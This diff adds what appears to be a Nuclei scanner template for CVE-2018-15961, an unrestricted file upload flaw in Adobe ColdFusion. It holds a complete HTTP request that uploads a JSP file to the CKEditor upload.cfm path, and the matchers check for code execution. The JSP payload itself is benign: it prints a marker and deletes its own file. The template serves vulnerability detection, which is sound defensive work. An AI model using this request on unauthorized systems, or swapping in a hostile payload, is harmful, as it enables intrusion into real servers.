@@ -1,0 +1,40 @@
+id: cve-2018-15961
+
+info:
+  name: Adobe ColdFusion upload.cfm file upload (CVE-2018-15961)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update 6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability. Successful exploitation could lead to arbitrary code execution.
+  reference:
+    - https://nosec.org/home/detail/1958.html
+
+http:
+  - raw:
+      - |
+        POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Length: {{length}}
+
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="{{rand_base(32)}}.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        regex:
+          - ".*e165421110ba03099a1c0393373c5b43.*"
+        part: body
+
+      - type: regex
+        regex:
+          - "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/"
+        part: body
